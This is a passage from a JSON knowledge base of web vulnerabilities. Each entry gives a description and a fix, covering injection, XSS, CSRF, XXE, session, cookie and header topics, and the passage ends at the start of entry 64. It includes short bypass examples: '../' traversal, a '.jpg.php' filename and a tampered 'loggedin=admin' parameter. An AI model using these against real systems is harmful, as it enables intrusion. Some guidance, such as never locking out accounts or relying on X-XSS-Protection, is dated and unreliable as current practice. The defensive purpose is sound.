{
"items": [
{
"kbId": 1,
"title": "use me for a header",
"Description": "I am used as a header  ",
"Solution": "I am used as a header"
},
{
"kbId": 2,
"title": "Filename injection Path traversal",
"Description": "A Path Traversal attack aims to access files and directories that are stored outside the web root folder. By browsing the application, the attacker looks for absolute links to files stored on the web server. By manipulating variables that reference files with dotdotslash (../); sequences and its variations, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and critical system files, limited by system operational access control. The attacker uses  ../../ sequences to move up to root directory, thus permitting navigation through the file system. This attack can be executed with an external malicious code injected on the path, like the Resource Injection attack.  ",
"Solution": "The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path."
},
{
"kbId": 3,
"title": "XSS injection",
"Description": "Every time the application gets userinput, whether this showing it on screen or processing this data in the application background, these parameters should be escaped for malicious code in order to prevent crosssite scripting injections. When an attacker gains the possibility to perform an XSS injection, he is given the opportunity to inject HTML and JavaScript code directly into the application. This could lead to accounts being compromised by stealing session cookies or directly  affect the operation of the target application. Altough templating engines(razor, twig, jinja, etc) and contextaware applications(Angular, React, etc) do a lot of auto escaping for you. These frameworks should always be validated for effectiveness.  ",
"Solution": "In order to prevent XSS injections, all userinput should be escaped or encoded. You could start by sanitizing userinput as soon as it is inserted into the application, by preference using a so called whitelisting method. This means you should not check for malicious content like the tags or anything, but only allow the expected input. Every input which is outside of the intended operation of the application should immediately be detected and login rejected. Do not try to help use the input in any way because that could introduce a new type of attack by converting characters. The second step would be encoding all the parameters or userinput before putting this in your html with encoding libraries specially designed for this purpose.You should take into consideration that there are several contexts for encoding userinput for escaping XSS injections. These contexts are amongst others:* HTML encoding, is for whenever your userinput is displayed directly into your HTML. * HTML attribute encoding, is the type of encoding/escaping that should be applied    whenever your user input is displayed into the attribute of your HTML tags. * HTML URL encoding, this type of encoding/escaping should be applied to whenever you are using userinput into a HREF tag.JavaScript encoding should be used whenever parameters are rendered via JavaScript; your application will detect normal injections in the first instant. But your application still remains vulnerable to JavaScript encoding which will not be detected by the normal encoding/escaping methods."
},
{
"kbId": 4,
"title": "Command injection",
"Description": "Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attackersupplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. This attack differs from Code Injection, in that code injection allows the attacker to adds his own code that is then executed by the application. In Code Injection, the attacker extends the default functionality of the application without the necessity of executing system commands. ",
"Solution": "Userinput that is used in a shell command should not contain dangerous characters. A blacklist of characters is not a good option because it may be difficult to think of all of the characters to validate against. A white list containing only allowable characters should be created to validate the userinput. "
},
{
"kbId": 5,
"title": "Cross site request forgery",
"Description": "CrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site, email, blog, instant message, or program causes a users Web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.The impact of a successful crosssite request forgery attack is limited to the capabilities exposed by the vulnerable application. For example, this attack could result in a transfer of funds, changing a password, or purchasing an item in the users context. In effect, CSRF attacks are used by an attacker to make a target system perform a function (funds Transfer, form submission etc.) via the targets browser without knowledge of the target user at least until the unauthorised function has been committed. ",
"Solution": "To arm an application against automated attacks and tooling you need to use unique tokens which are included into the forms of an application, API calls or AJAX requests.   Any state changing operation requires a secure random token (e.g CSRF token) to prevent against CSRF attacks. Characteristics of a CSRF Token are a unique, large random value generated by a cryptographically secure random number generator.The CSRF token is then added as a hidden field for forms and validated on the sever side whenever a user is sending a request to the server.Note : Whenever the application is an REST service and is using tokens such as JWT tokens, whenever these tokens are being sent in the application headers rather than stored in cookies the application should not be suspectible to CSRF attacks for a succesfull CSRF attacke depends on the browsers cookie jar. "
},
{
"kbId": 6,
"title": "XXE injections",
"Description": "Processing of an Xml eXternal Entity containing tainted data may lead to the disclosure of confidential information and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type.There exists a specific type of entity, an external general parsed entity often shortened to an external entity, that can access local or remote content via a declared system identifier and the XML processor may disclose confidential information normally not accessible by the application. Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data. ",
"Solution": "Disable the possibility to fetch resources from an external source. This is normally done in the configuration of the used XML parser. "
},
{
"kbId": 7,
"title": "X Path injections",
"Description": "Web applications heavily use databases to store and access the data they need for their operations. Historically, relational databases have been by far the most common technology for data storage, but in the last years, we are witnessing an increasing popularity for databases that organise data using the XML language. Just like relational databases are accessed via SQL language, XML databases use XPath as their standard query language. ",
"Solution": "Just like the techniques to avoid SQL injection, you need to use a parameterised XPath interface if one is available, or escape the user input to make it safe to include in a dynamically constructed query. If you are using quotes to terminate untrusted input in a dynamically constructed XPath query, then you need to escape that quote in the untrusted input to ensure the untrusted data can not try to break out of that quoted context. "
},
{
"kbId": 8,
"title": "XML injection",
"Description": "XML Injection is an attack technique used to manipulate or compromise the logic of an XML application or service. The injection of unintended XML content and/or structures into an XML message can alter the intended logic of the application. Further, XML injection can cause the insertion of malicious content into the resulting message/document. ",
"Solution": "In addition to the existing input validation, define a positive approach which escapes/encodes characters that can be interpreted as XML. At a minimum this includes the following: < > / \" '' "
},
{
"kbId": 9,
"title": "XSLT injections",
"Description": "A vulnerability occurs when an XSL file is loaded from a source controlled by an attacker. When the attacker is given the opportunity to specify the source of the included XSL file he could include a file which contains malicious code to be parsed on the target application. This could lead to, code execution, reading arbitrary files and many more vulnerabilities such as XSS. ",
"Solution": "To protect against such vulnerability one needs to make sure that he does not use usersupplied input in the XSL filename. The best solution would be to define a list of permitted filenames and only accept XSL filenames from that list. "
},
{
"kbId": 10,
"title": "External DTD parsing",
"Description": "Processing of an external entity containing tainted data may lead to the disclosure of confidential information and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. There exists a specific type of entity, an external general parsed entity often shortened to an external entity that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be dereferenced (accessed) by the XML processor when processing the entity. The XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via HTTP(s) requests. In some situations, an XML processor library that is vulnerable to clientside memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.  ",
"Solution": "Disable the XML DTD (Document Type Definition) parsing. This can be set when initiating the XML parser. "
},
{
"kbId": 11,
"title": "LDAP injection",
"Description": "LDAP (Lightweight Directory Access Protocol) Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it is possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection. ",
"Solution": "The best way to prevent LDAP injection is to use a positive validation scheme for ensuring that the data going into your queries does not contain any attacks. However, in some cases, it is necessary to include special characters in the input that is passed into an LDAP query. In this case, using escaping can prevent the LDAP interpreter from thinking those special characters are actually part of the LDAP query. "
},
{
"kbId": 12,
"title": "SSI injections",
"Description": "Web servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with fullfledged serverside or clientside languages.This feature is incarnated by the ServerSide Includes (SSI). The attacker will try to inject code into the application that will be interpreted by SSI mechanisms. A successful exploitation of this vulnerability allows an attacker to inject code into HTML pages or even perform remote code execution. ",
"Solution": "The SSI handler on the webserver should not be activated when it is not used. "
},
{
"kbId": 13,
"title": "File upload injections",
"Description": "Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to backend systems, and simple defacement.There are really two classes of problems here. The first is with the file metadata, like the path and file name. These are generally provided by the transport, such as HTTP multipart encoding. This data may trick the application into overwriting a critical file or storing the file in a bad location. You must validate the metadata extremely carefully before using it.The other class of problem is with the file size or content. An attacker can easily craft a valid image file with PHP code inside. ",
"Solution": " Uploaded files always need to be placed outside the document root of the webserver  Check to not accept large files that could fill up storage or cause a denial of service attack  Check the userinput(filename) for having the right allowed extensions such as .jpg, .png etc   Note: when checking these extensions always make sure your application validates the last   possible extension so an attacker could not simply inject \".jpg.php\" and bypass your   validation Check the userinput(filename) for containing possible path traversal patterns in order to prevent him from uploading outside of the intended directory.You may also want to check if the filenames do already exist before uploading in order to prevent the overwriting of files.Also for serving the files back there needs to be a file handler function that can select the file based on an identifier that will serve the file back towards the user.Most developers also do a mimetype check. This is a good protection however not whenever you are checking this mimetype through the post request. This header can not be trusted since it can be easily manipulated by an attacker.The best way to check the mimetype is to extract the file from the server after uploading and check it from the file itself. Deleting it whenever it does not comply with expected values."
},
{
"kbId": 14,
"title": "Version management",
"Description": "Whenever a programmer decides to use third party software, he should keep an eye implementing a proper version management methodology for this software. When hackers discover vulnerabilities they often publish these exploits online in order to push the developers of this software to fix their issues. As a result, when your software is not upgraded to the latest available version, script kiddies could easily compromise your application by following the exploit tutorials online, thus compromising your application. ",
"Solution": "One option is not to use components that you did not write. But that is not very realistic.Most component projects do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version. So upgrading to these new versions is critical. Software projects should have a process in place to:Identify all components and the versions you are using, including all dependencies. (e.g., the versions plugin).Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up to date.Establish security policies governing components use, such as requiring certain software development practices, passing security tests, and acceptable licenses.Where appropriate, consider adding security wrappers around components to disable unused functionality and/ or secure weak or vulnerable aspects of the component.This also goes for all other components that should be up to date with proper security configuration(s) and version(s) such as server OS etc.This should include removal of unneeded configurations and folders such as sample applications, platform documentation, and default or example users. "
},
{
"kbId": 15,
"title": "Verbose error messaging",
"Description": "An important aspect of secure application development is to prevent information leakage.  Error messages give an attacker great insight into the inner workings of an application.The purpose of reviewing the Error Handling code is to assure the application fails safely under all  possible error conditions, expected and unexpected. No sensitive information is presented to the user  when an error occurs.When an exception or error is thrown we also need to log this occurrence. Sometimes this is due to bad development, but it can be the result of an attack or some other service your application relies on failing.All code paths that can cause an exception to be thrown should check for success in order for the exception  not to be thrown. ",
"Solution": "We should use a localized description string in every exception, a friendly error reason such as \u201cSystem Error \u2013 Please try again later\u201d. When the user sees an error message, it will be derived from this description string of the exception that was thrown, and never from the exception class which may contain a stack trace, line number where the error occurred,  class name or method name.Do not expose sensitive information in exception messages. Information such as paths on the local file system is considered privileged information; any system internal information should be hidden from the user. As mentioned before an attacker could use this information to gather private user information from the application or components that make up the app.Don\u2019t put people\u2019s names or any internal contact information in error messages. Don\u2019t put any \u201chuman\u201d information, which would lead to a level of familiarity and a social engineering exploit.Another good example would be for password forget functions to throw a generic error message when a email adress is or is not known on the system. This should prevent enumeration of email adresses."
},
{
"kbId": 16,
"title": "Debug enabeling",
"Description": "Sometimes it is possible through an \"enabling debug parameter\" to display technical information/secrets within the application. As a result, the attacker learns more about the operation of the application, increasing his attack surface. Sometimes having a debug flag  enabled could even lead to code execution attacks (older versions of werkzeug)  ",
"Solution": "Disable the possibility to enable debug information on a live environment. "
},
{
"kbId": 17,
"title": "Robots.txt",
"Description": "Each site uses a robots.txt file which allows search engines to provide information. The robots.txt determines what pages may or may not be indexed by google or yahoo etc. However, a common mistake made by programmers is applying a blacklisting method causing the application displaying sensitive information to attackers. ",
"Solution": "Instead of the blacklisting method:Useragent: * Disallow: /squirrelmail/ Disallow: /admin/ Disallow: /modules/You should use a whitelisting method:Useragent: * Disallow: * Allow: /index.html Allow: /home.html "
},
{
"kbId": 18,
"title": "Accessible non parsed dynamic scripts",
"Description": "Applications often include files in other pages. When these files can be directly approached by normal users, the operation of the application can be traced because the source code becomes available. This improves the possibility that the attacker discovers vulnerabilities.It is also highly recommended that old files are removed from the server and not beind stored or backuped as i.e \"file.php.old\".  ",
"Solution": "Always add the different types of extensions to the webserver handler to parse. This way the file source cannot be viewed. "
},
{
"kbId": 19,
"title": "Include anti caching headers",
"Description": "Anticaching headers have the ability to tell the browser, computer and proxies what information they may or may not store on the intermediate media ",
"Solution": "These headers are also known as the: Cachecontrol: nostore,nocache and provide protection of sensitive information when implemented in the application or webserver.Rightly configured anti caching headers will look like the following as a response\tExpires: Tue, 03 Jul 2001 06:00:00 GMT \tLastModified: {now} GMT \tCacheControl: nostore, nocache, mustrevalidate, maxage=0 \tCacheControl: postcheck=0, precheck=0 \tPragma: nocache "
},
{
"kbId": 20,
"title": "Include anti clickjacking headers",
"Description": "Clickjacking, also known as a \"UI redress attack\", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top level page. Thus, the attacker is \"hijacking\" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both.Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker. ",
"Solution": "To avoid your application from being clickjacked you can add the XframeOptions header to your application. These headers can be configured as:    XframeOptions: denyThe page cannot be displayed in a frame, regardless of the site attempting to do so.    XFrameOptions: sameorign  The page can only be displayed in a frame on the same origin as the page itself.    XFrameOptions: ALLOWFROM uriThe page can only be displayed in a frame on the specified origin.You may also want to consider to include \"Framebreaking/Framebusting\" defense for legacy browsers that do not support XFrameOption headers.Source: https://www.codemagi.com/blog/post/194 "
},
{
"kbId": 21,
"title": "Include X XSS",
"Description": "This header enables the Crosssite scripting (XSS) filter built into most recent web browsers. It is usually enabled by default anyway, so the role of this header is to reenable the filter for this particular website if it was disabled by the user. This header is supported in IE 8 and in Chrome 4. ",
"Solution": "These headers are also known as the: XXSSProtection: 1; mode=block and provide protection against XSS attacks when implemented in the application or webserver.NOTE: This header only protects against some reflected XSS attacks. This is no substitute for normal escaping and input filtering and sanitization. "
},
{
"kbId": 22,
"title": "Include X Content Type Options header",
"Description": "The only defined value, nosniff, prevents Internet Explorer and Google Chrome from MIMEsniffing a response away from the declared contenttype. This also applies to Google Chrome, when downloading extensions. This reduces exposure to driveby download attacks and sites serving user uploaded content that, by clever naming, could be treated by MSIE as executable or dynamic HTML files. ",
"Solution": "These headers are also known as the: XContentTypeOptions: nosniff; and provide protection against Mime content type attacks when implemented in the application or webserver. "
},
{
"kbId": 25,
"title": "Include Strict Transport Security header",
"Description": "HTTP StrictTransportSecurity (HSTS) enforces secure (HTTP over SSL/TLS) connections to the server. This reduces the impact of bugs in web applications leaking session data through cookies and external links and defends against Maninthemiddle attacks. HSTS also disables the ability for user''s to ignore SSL negotiation warnings ",
"Solution": "These headers are also known as the: StrictTransportSecurity: maxage=16070400: includeSubDomains and provide protection against SSL Strip attacks when implemented in the application or web server.When connecting to an HSTS host for the first time, the browser won''t know whether or not to use a secure connection, because it has never received an HSTS header from that host. Consequently, an active network attacker could prevent the browser from ever connecting securely (and even worse, the user may never realize something is amiss). To mitigate this attack, you can add your application to a preload list which makes HSTS enforced by default. When a user connects to one of these hosts for the first time, the browser will know that it must use a secure connection. If a network attacker prevents secure connections to the server, the browser will not attempt to connect over an insecure protocol, thus maintaining the user''s security.Visit:     https://hstspreload.appspot.com/ Here you can find how to add your application to HSTS preload "
},
{
"kbId": 26,
"title": "Sensitive information stored in cookies",
"Description": "Sensitive data should not be stored in a cookie,because the cookie is also used on the clientside and is adaptable thus making its content readable. A hacker could gain access to a cookie through cross site scripting attacks and gain the sensitive information stored in the targets cookie. ",
"Solution": "Do not store sensitive information in cookies. "
},
{
"kbId": 27,
"title": "Client side state management",
"Description": "An application can implement all kinds of logic rules through JavaScript and HTML. However, these are clientside constraints that a hacker can easily disable or modify. ",
"Solution": "User restrictions should always be imposed by serverside techniques instead of clientside constraints. "
},
{
"kbId": 28,
"title": "Too verbose authentication",
"Description": "The error messages that are displayed when a user fails to login into an application should be selected with caution. When this error message gives away too much information, this information can be exploited by a hacker. ",
"Solution": "The application should never publish available usernames. When an attacker gains this information he increases his attack vector and reduces the time required to identify accounts.I.e:Imagine a forgot password function where the user enters his username in order for the application to send a new password to his email address, the user enters a correct username and the application responds with:\u201cEmail successfully sent to your email address.\u201d When the user enters an incorrect username it says,  \u201cError: user does not exist.\u201dThis function would be vulnerable to username enumeration "
},
{
"kbId": 29,
"title": "Brute force password guessing",
"Description": "Login functions should not be abused in an automated way that an attacker could create a script that contains a list of usernames and passwords, which he could use against your login function in order to gain unauthorized access to user accounts. ",
"Solution": "Implement a method that limits the amount of tries with automated tools. Some examples are using a CAPTCHA or a TARPIT(ratelimiting) method.Be aware that a simple limitation on number of tries may be used as a method to perform denialofservice attack and hence to block certain users like system administrator from logging in. A mechanism combines tries limit with challengeresponse test can be used to prevent this risk while providing convenience for actual user login. For example, start to ask user to complete a CAPTCHA or a TARPIT question during login after a certain number of tries is reached. "
},
{
"kbId": 30,
"title": "Denial of service by locking out accounts",
"Description": "Whenever the opportunity to log into the application is offered, it should not lock out accounts. A hacker could abuse this function to make the application deny access towards its power users. ",
"Solution": "The application should not lockout users when they enter false login credentials. "
},
{
"kbId": 31,
"title": "Predictable password and or token generation",
"Description": "Tokens or passwords that are used within the application must contain high entropy in order to prevent the prediction of these values. ",
"Solution": "Tokens should contain a high level entropy and randomness to prevent predictable token generation. All random numbers, random file names, random GUIDs, and random must be generated using the cryptographic module''s approved random number generator when these random values are intended to be unguessable by an attacker. "
},
{
"kbId": 32,
"title": "Unauthorized credential changes",
"Description": "An application which offers user login functionality, usually has an administration page where userdata can be modified. When the user wants to change this data he should specify his current password. ",
"Solution": "When changing user credentials or email address the user must always enter a valid password in order to implement the changes. This is also called reauthentication or stepup / adaptive authentication. Whenever a user \"reauthenticates\" himself the current session ID value should also be refreshed in order to fend oFf so called \"session hijackers\" "
},
{
"kbId": 33,
"title": "Double decoding of headers parameters",
"Description": "Double decoding is a problem which often occurs when multiple servers are used in which a configuration error is made. A hacker can encode his payload differently so it will not be recognized by a Web Application Firewall (WAF) or an Intrusion Detection System (IDS) and also bypass the escaping of the application.By using double encoding it''s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don''t have the corresponding security checks in place.Attackers can inject double encoding in pathnames or query strings to bypass the authentication scheme and security filters in use by the web application. ",
"Solution": "Only one webserver should decode/encode the data. "
},
{
"kbId": 34,
"title": "Resource identifier injection",
"Description": "A resource identifier injection basically means that the attacker can determine which resources are loaded into the web application. An attacker could thus influence the operation of the web application and redirect users to other websites. This attack consists of changing resource identifiers used by an application in order to perform a malicious task. When an application permits a user input to define a resource, like a file name or port number, this data can be manipulated to execute or access different resources. In order to be properly executed, the attacker must have the possibility to specify a resource identifier through the application form and the application must permit the execution. The resource type affected by user input indicates the content type that may be exposed. For example, an application that permits input of special characters like period, slash, and backlash is risky when used in methods that interact with the file system. The resource injection attack focuses on accessing other resources than the local filesystem, which is different attack technique known as a Path Manipulation attack. ",
"Solution": "Safe use of resource identifiers can be done by performing authorisation checks if the identifier belongs to the user. "
},
{
"kbId": 35,
"title": "Dynamic scripting injection",
"Description": "When user input is used to evaluate scripting code, highsecurity risks could be introduced. If the input is not properly escaped an attacker can inject his own script code and gain access to the server. ",
"Solution": "Do not use direct userinput in the dynamic scripting function. You should first use an input validation or encoding function on the user submitted data to clean and sanitize the input against malicious intent. "
},
{
"kbId": 36,
"title": "Regular expression injection",
"Description": "If the application uses regular expressions which receive user input, then the user input should be properly escaped. If not done properly, then the hacker can affect the regular expression and modify their logic. In some cases, an attacker could even gain access to the server.  ",
"Solution": "Do not use userinput without escaping in a regular expression \"regex pattern\", Since this could lead to serious security vulnerabilities. "
},
{
"kbId": 37,
"title": "Automated spamming via feedback scripts",
"Description": "A hacker must not gain the ability to abuse an applications email functionality by means of scripts which sends automated spamming mails. ",
"Solution": "This problem could be prevented by implementing CAPTCHA or ratelimiting mechanisms. "
},
{
"kbId": 38,
"title": "Session cookies without the Secure attribute",
"Description": "The secure flag is an option that can be set when creating a cookie. This flag ensures that the cookie will not be sent over an unencrypted connection by the browser,which ensures that the session cookie can not be sent over a nonencrypted link. ",
"Solution": "When creating a session cookie which is sent over an encrypted connection you should set the secure flag. The Secure flag should be set during every setcookie. This will instruct the browser to never send the cookie over HTTP. The purpose of this flag is to prevent the accidental exposure of a cookie value if a user follows an HTTP link. "
},
{
"kbId": 39,
"title": "Session cookies without the HttpOnly attribute",
"Description": "An HttpOnly flag is an option that can be set when creating a cookie. This v ensures that the cookie cannot be read or edited by JavaScript. This ensures an attacker cannot steal this cookie as a crosssite scripting vulnerability is present in the application. ",
"Solution": "The HttpOnly flag should be set to disable malicious script access to the cookie values such as the session ID value. Also, disable unnecessary HTTP request methods such as the TRACE option. Misconfiguration of the HTTP request headers can lead to stealing the session cookie even though HttpOnly protection is in place. "
},
{
"kbId": 40,
"title": "External session hijacking",
"Description": "When an attacker obtains a users session cookie, then he can steal the identity of the user which the session cookie belongs to. ",
"Solution": "As soon as a session is set for an authenticated user, the server should keep track of the IP address in which the user used when he started the session. When the server discovers a change in IP address, for instance when an attacker hijacks an users session. The server then should deny access, destroy the session and redirect the ''hijacker'' to the login page. "
},
{
"kbId": 41,
"title": "Insecure transmission of session cookies",
"Description": "If the session cookies are sent over an unencrypted connection, they should be withdrawn immediately. These cookies are not to be trusted anymore as a hacker may have captured their values. ",
"Solution": "Session cookies that are used to authenticate the user should always be set on a secure connection.In order to achieve this, you should set the \"secure\" flag on your session cookie to make sure your application in any circumstance does not send this cookie over nonHTTPS connections. "
},
{
"kbId": 42,
"title": "Unproven cryptographic algorithms",
"Description": "The encryption techniques used in the application must be known and proven methods. When there is a selfmade hashing algorithm developed, it is likely to contain vulnerabilities due to mathflaws resulting in encryption which can be broken. ",
"Solution": "Never implement your own designed Crypto functions. Verify that cryptographic modules used by the application have been validated against FIPS 1402 or an equivalent standard. "
},
{
"kbId": 43,
"title": "Client side authentication",
"Description": "An application could implement authentication functionalities through JavaScript and HTML. However, these are clientside constraints that are imposed, which means that a hacker can easily disable or modify these constraints. ",
"Solution": "Never implement clientside authentication constraints, since these are easily bypassed. When implementing authentication methods always use serverside solutions. "
},
{
"kbId": 44,
"title": "Identifier based authorization",
"Description": "An application uses parameters in order to process data. These parameters can also be used to assign certain roles and retrieve Content corresponding with those parameters. For example:    www.target.com/index.php?loggedin=userIn this situation the application will get content and subscribe user roles corresponding to the user parameter.    www.target.com/index.php?loggedin=adminIn this situation the application will get content and subscribe user roles corresponding to the admin parameter. (Note: the above two links are no longer available.) ",
"Solution": "Whenever you are checking whether a user is restricted to review certain data, the access restrictions should be processed serverside.The userID should be stored inside of a session variable on login and should be used to retrieve user data from the database like : SELECT data from personaldata where userID=:id < session varNow a possible attacker cannot tamper and change the application operation since the identifier for retrieving the data is handled serverside. "
},
{
"kbId": 45,
"title": "Principle of complete mediation",
"Description": "Throughout development of the application, there must be perpetual checks in place to check if all pages and resources by default require authentication except those specifically intended to be public.Sometimes developers simply forget to implement these checks, or they remove the checks  temporarily for testing purposes.  ",
"Solution": "Verify all access controls are implemented properly in order to prevent a user access data/functions which  he was not intended to use. "
},
{
"kbId": 46,
"title": "Prepared statements and query parameterization",
"Description": "All SQL queries, HQL, OSQL, NOSQL and stored procedures, related to stored procedures should be protected by the use of query parameterization. If an attacker can inject malicious code into these queries and gain the ability to manipulate them and can withdraw, update and delete data which is stored on the target database. ",
"Solution": "The use of prepared statements and parameterized queries is how all developers should first be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied. "
},
{
"kbId": 51,
"title": "Are all passwords hashed, salted and stretched",
"Description": "Verify that account passwords are one way hashed with a salt, and there is sufficient work  factor to defeat brute force and password hash recovery attacks. ",
"Solution": "Recommended for password usage are PBKDF functions. PBKDF2 uses a pseudorandom function  and a configurable number of iterations to derive a cryptographic key from a password.  Because this process is difficult to reverse (similar to a cryptographic hash function) but can also be configured to be slow to compute, key derivation functions are ideally  suited for password hashing use cases.Another alternative would be bcrypt. bcrypt is a password hashing function designed by  Niels Provos and David Mazi\u00e8res, based on the Blowfish cipher, and presented at USENIX in  1999. Besides incorporating a salt to protect against rainbow table attacks, bcrypt is an  adaptive function: over time, the iteration count can be increased to make it slower,  so it remains resistant to bruteforce search attacks even with increasing computation power. "
},
{
"kbId": 52,
"title": "Sensitive information transmitted by unencrypted methods",
"Description": "Whenever sensitive information is sent by unencrypted methods an attacker could intercept this data and use this for malicious intents. ",
"Solution": "All sensitive information should always be sent by encrypted methods such as HTTPS(TLS) connections. "
},
{
"kbId": 53,
"title": "Session information is not stored server side",
"Description": "Whenever session information is not stored on the serverside an attacker could easily tamper and manipulate these values. This is always a bad idea and you should not do this! ",
"Solution": "Session information should always be stored  on the serverside by means of a serverside language. "
},
{
"kbId": 54,
"title": "The crossdomain xml should only contains trusted domains",
"Description": "The use of a crossdomain.xml file is required when the web application uses Flash. This file is used to set up restrictions for any other web servers using the flash application. If these are not set correctly, an attacker could exploit this to execute targeted attacks against the users of the web application. ",
"Solution": "Always make sure the crossdomain.xml only contains trusted domains. "
},
{
"kbId": 55,
"title": "Session ids should be generated with sufficient entropy",
"Description": "Whenever session IDs are not generated with a sufficient entropy this could lead to a session collision or session hijacking. If an attacker can guess an authenticated user''s session identifier, he can take over the user''s session. ",
"Solution": "The WebLogic deployment descriptor should specify a session identifier length of at least 128 bits. A shorter session identifier leaves the application open to bruteforce session guessing attacks. "
},
{
"kbId": 56,
"title": "User generated session ids should be rejected by the server",
"Description": "Whenever user generated session IDs are not rejected by the server, an attacker could change the session credentials given by the server on the targets computer into an easy to remember value.The attacker then changes his own session credentials with the easily to remember value he used on the target''s computer. Through this,  the attacker could do a session hijacking on the targets current session. ",
"Solution": "All session IDs not generated by the server should be rejected. "
},
{
"kbId": 57,
"title": "The logout functionality should revoke the complete session",
"Description": "When the logout functionality does not revoke the complete session, an attacker could still impersonate a user when he has access to the session cookie even after the user is logged off the application. ",
"Solution": "The logout functionality should revoke the complete session whenever a user wants to terminate his session.Each different framework has its own guide to achieve this revocation. It is also recommended for you to make test cases which you follow to ensure session revocation in your application. "
},
{
"kbId": 58,
"title": "The login functionality should always generate a new session id",
"Description": "Whenever an user is successfully authenticated the application should generate a new session cookie. ",
"Solution": "The login functionality should always generate (and use) a new session ID after a successful login. This is done to prevent an attacker doing a session fixation attack on your users.Some frameworks do not provide the possibility to change the session ID on login such as .net applications. Whenever this problem occurs you could set an extra random cookie on login  with a strong token and store this value in a session variable.Now you can compare the cookie value with the session variable in order to prevent session fixation since the authentication does not solely rely on the session ID since the random cookie can not be predicted or fixated by the attacker. "
},
{
"kbId": 59,
"title": "Does The application enforce the use of secure passwords",
"Description": "Applications should encourage the use of strong passwords and passphrases. Preferably the password policy should not put limitations or restrictions on the chosen passwords (for example the length of a password). Whenever the application supports strong passwords and the use of password managers, the possibility for an attacker performing a succesfull bruteforce  attack drops significantly. This also increases the possibility that the application can be used with users'' passwords managers. ",
"Solution": "Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent password managers, long passphrases or highly complex passwords being entered.  A password ideally should be: * at least 12 characters in length * passwords even longer than 64 characters are allowed * every special characters from Unicode charset should be permitted (including emoki, kanji, multiple whitespaces, ecc.) * No limit for the number of characters allowed from the same type (lowercase characters, uppercase characters, digits, symbols)  "
},
{
"kbId": 60,
"title": "Session IDs do not timeout (idl)",
"Description": "All sessions should implement an idle or inactivity timeout. This timeout defines the amount of time a session will remain active in case there is no activity in the session, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The idle timeout limits the chances an attacker has to guess and use a valid session ID from another user. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker''s actions, as he can generate activity on the session periodically to keep the session active for longer periods of time.Session timeout management and expiration must be enforced on the serverside. If the client is used to enforce the session timeout, for example using the session token or other client parameters to track time references (e.g. number of minutes since login time), an attacker could manipulate these to extend the session duration. ",
"Solution": "All user sessions should timeout based on logic serverside in order to decrease an attackers attack vector on the user session. "
},
{
"kbId": 61,
"title": "Directory listing",
"Description": "Whenever directory listing is enabled, an attacker could gain sensitive information about the systems hierarchical structure and gain knowledge about directories or files which should possibly not be publicly accessible. An attacker could use this information to increase his attack vector. In some cases this could even lead to an attacker gaining knowledge about credentials or old vulnerable system demo functions which might lead to remote code execution. ",
"Solution": "Different types of servers require a different type of approach in order to disable directory listing. For instance: Apache uses a .htacces in order to disable directory listing. As for iis7, directory listing is disabled by default. "
},
{
"kbId": 62,
"title": "Unnecessary features enabled or installed",
"Description": "Whenever there are unnecessary features enabled or installed this could increase the attack surface of an attacker which could lead to serious danger such as XXE/CMD/XSS injections. ",
"Solution": "Make sure all features and software available on the application/server are necessary for application to work proper. If not, uninstall or disable these services. "
},
{
"kbId": 63,
"title": "Avoid the use of default and predictable acounts.",
"Description": "Whenever default or predictable accounts are available on an application/server this could lead to an attacker compromising these services. Make sure all default and predictable accounts are disabled or deleted from the services. ",
"Solution": "Verify that all keys and passwords are replaceable, and are generated or replaced after installation time. "
},
{
"kbId": 64,
"title": "Security settings in your development frameworks",
